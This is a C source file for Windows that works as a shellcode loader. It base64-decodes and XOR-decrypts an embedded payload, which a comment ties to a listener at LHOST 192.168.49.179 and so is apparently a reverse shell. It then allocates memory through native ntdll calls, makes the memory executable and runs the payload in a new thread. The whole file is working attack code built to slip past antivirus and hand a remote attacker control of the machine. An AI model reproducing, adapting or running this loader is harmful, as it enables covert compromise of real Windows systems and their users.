#pragma once
#pragma comment(lib,"ntdll.lib")

#include <Windows.h>
#include "structs.h"
#include "base64.h"
#include <stdio.h>


typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer
	);


PVOID VxMoveMemory(
	_Inout_ PVOID dest,
	_In_    const PVOID src,
	_In_    SIZE_T len
);

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = dest;
	const char* s = src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}

int main(int argc, char* argv[]) {
	NTSTATUS status = 0x00000000;
	PVOID localSectionAddress = NULL;
	PVOID remoteSectionAddress = NULL;

	//  LHOST=192.168.49.179
	char shellcode[601] = "";
	char* encoded = "rz3z14K7/2NyMzVwEiUie0OBYgY6uCZBBT37YWobuDFSe/9TAzhB+jpchCk4e0Xh/0kRT3B/EyKz+nlgUrSS3iASYiv5YVSqEUk4MqI1shtqOHYu1gdwM3LYs+tyM3Rp1rUEVDpS4zP5e2xl2DVQenOD0DU6zL1g2EH4fkOae2Kke0Xh/zSx+n8SMqJK0wHQH3Y8F3oWCrIH6yxl2DVUenODVSL5Pzxl2DVsenODcuh2uzwggzQocioNajkzazV4Ei84sJ5zcjGN0yxgCi84uGC6eJyNzClpYq4jeswkWg0bXRFVUzQme/uyeqSwfwMHVIqlYCEbuoIhaTkQkzhB+iEAetlIZQ2GU3VwM42G22xyM3QQakdeAkRrHVdLHUUWanUqe/uSeqSyiHUhUzhB+iEAWWAhes522uq2M3JTM5yn21ohU3VfQkNrawIUQU1JCgcReQYgWBYQXhdDAh8BXRY1Rgg6Sj5mERQZAiA9RSYEVSEhG/yxYCgSay5D+idp63VCm/ZTM2NyYydyGrKy2Cd9CJyne/3nOX8ve/uiWXwoYRyhYHVwevuzWWczaj2bJjPutXJTM2ON5jkQkyYqe/uiflK7fkXoACY59LB+NXsJzKGkkwBve7WSu3ByMz2bF4VF03JTM2ON5jzenAFy2Ni7ZmNyMyd4OTUqevuC8oFierPhU2VwMzvpa8ch1nQhU3WP5jrAYDA6upNp2oQ4uqga9KNyE3QhGvyJeshBpeqQM3QhU4qle/GXE+ayR8ZH2HI4MrHW8xaga7d5OXUpiJJOGWkzuq7ehg==";
	//unsigned char encrypted[]="";

	printf("[+] Decoding b64 payload...\n");
	int result = Base64decode((char*)shellcode, encoded);
	
	/*
	for (int i = 0; i < sizeof(shellcode); i++) {
		printf("\\x%02x", shellcode[i] & 0xff);
	}
	*/
	

	printf("[+] Decrypting shellcode...\n");
	unsigned char key[] = "SuperS3cr3t!";
	for (int i = 0; i < sizeof(shellcode); i++) {
		shellcode[i] = shellcode[i] ^ key[i % (sizeof(key) - 1)];
		//printf("\\x%02x", shellcode[i] & 0xff);

	}

	FARPROC NtAllocateVirtualMemory = GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtAllocateVirtualMemory");
	pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtCreateThreadEx");
	FARPROC NtProtectVirtualMemory = GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtProtectVirtualMemory");
	GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtWaitForSingleObject");

	PVOID lpAddress = NULL;
	SIZE_T sDataSize = sizeof(shellcode);
	printf("[+] Allocating memory...\n");
	status = NtAllocateVirtualMemory((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);
	printf("[+] Injecting the shellcode...\n");
	VxMoveMemory(lpAddress, shellcode, sizeof(shellcode));

	ULONG ulOldProtect = 0;
	printf("[+] Setting RX permissions to allocated memory...\n");
	status = NtProtectVirtualMemory((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);

	HANDLE hHostThread = INVALID_HANDLE_VALUE; 
	printf("[+] Executing shellcode as a new thread...\n");
	status = NtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

	LARGE_INTEGER Timeout;
	//Timeout.QuadPart = -100000000;
	Timeout.QuadPart = 9223372036854775807;
	NtWaitForSingleObject(hHostThread, FALSE, &Timeout);
}
